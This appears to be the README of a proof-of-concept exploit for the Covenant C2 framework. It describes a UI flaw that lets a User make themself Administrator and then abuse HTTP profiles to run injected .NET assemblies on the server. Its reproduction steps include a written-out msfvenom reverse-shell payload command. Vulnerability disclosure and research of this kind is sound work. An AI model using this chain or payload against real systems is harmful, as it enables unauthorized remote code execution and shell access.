# Covenant Low Privileged User RCE

Both the current master and dev branches of Covenant are vulnerable to an escalation of privilege from User to Administrator. The API [blocks editing roles](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Controllers/ApiControllers/CovenantUserApiController.cs#L298) unless you are an Administrator, however in the UI itself it's [possible for a User to give themself the Administrator role](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Components/CovenantUsers/EditCovenantUser.razor).

With the Administrator role, the user has access to the most powerful feature of Covenant, the ability to create HTTP profiles. This feature is [restricted to Administrators](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Core/CovenantService.cs#L3616). Although there is no built-in way to get a shell on a Covenant server, the HTTP profiles feature essentially enables running C# code on the server as a way of customizing traffic sent to and from implants.

The C# code is limited by the fact that the built-in Covenant compiler [restricts the `System` namespace](https://github.com/cobbr/Covenant/blob/5decc3ccfab04e6e881ed00c9de649740dac8ad1/Covenant/Core/Common.cs#L85) to `System.Private.CoreLib.dll` which means `Process` can't be directly used. However [previous excellent research](https://web.archive.org/web/20220126104152/https://blog.null.farm/hunting-the-hunters) on Covenant by 0xcoastal found a blog post by Tim Malcolmvetter that showed that only the `Activator` and `Assembly` classes are required to perform process injection of arbitrary .NET assemblies.

The privilege escalation part of this attack must be performed manually as only the Blazor UI is vulnerable and not the API, and the Blazor stuff is a pain to automate.

The RCE is automated by `covenant_rce.py`, which interacts with the API to create a HTTP profile, a HTTP listener, then communicates with the listener to trigger a provided .NET assembly to run.

## Reproduction

1. In the Covenant UI, escalate privileges from User to Administrator by clicking Users -> Your Username -> Roles -> Administrator -> Edit Roles
2. In `covenant_rce.py`, edit variables at the top of the script
3. Generate csharp shellcode, e.g. `msfvenom -f csharp -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread`
4. Copy shellcode buffer into `Shellcode.cs` and compile the `ShellcodeAssembly` project in Release mode in Visual Studio
5. Run `python covenant_rce.py`

## References

* https://web.archive.org/web/20220126104152/https://blog.null.farm/hunting-the-hunters
* https://github.com/malcomvetter/ManagedInjection
